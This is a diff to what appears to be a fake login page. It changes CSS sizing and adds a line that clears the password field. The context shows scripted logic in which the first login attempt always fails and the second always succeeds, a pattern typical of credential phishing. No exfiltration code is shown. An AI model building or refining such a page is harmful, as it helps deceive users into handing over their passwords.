@@ -13,10 +13,12 @@
             height: 100vh;
             margin: 0;
             background-color: #f0f0f0;
+            padding: 0;
+            box-sizing: border-box;
         }
         .container {
-            width: 80%;
-            max-width: 300px;
+            width: 100%;
+            max-width: 350px;
             text-align: center;
             background-color: white;
             padding: 20px;
@@ -24,8 +26,7 @@
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
         img {
-            width: 100%;
-            max-width: 150px;
+            width: 50%; /* 50% smaller image */
             margin-bottom: 20px;
         }
         input {
@@ -127,6 +128,7 @@
                         // First attempt fails
                         document.getElementById('error').style.display = 'block';
                         document.getElementById('loginForm').style.display = 'block';
+                        document.getElementById('password').value = '';  // Clear password field
                     } else if (attempt === 2) {
                         // Second attempt succeeds
                         document.getElementById('message').style.display = 'block';
